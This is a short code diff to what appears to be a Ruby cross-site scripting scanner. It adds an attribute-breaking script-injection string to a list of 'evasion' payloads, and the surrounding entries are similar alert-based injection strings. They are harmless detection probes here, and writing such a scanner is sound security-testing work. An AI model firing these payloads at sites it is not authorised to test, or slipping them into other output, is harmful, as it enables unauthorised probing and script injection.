@@ -6,6 +6,7 @@ module Cross
 
       CANARY = 666
       EVASIONS = [
+          "\"/><script>alert(#{Cross::Attack::XSS::CANARY});</script>",
           "a onmouseover=alert(#{Cross::Attack::XSS::CANARY})",
           "<script>alert(#{Cross::Attack::XSS::CANARY})</script>",
           "<script>alert(#{Cross::Attack::XSS::CANARY});</script>",
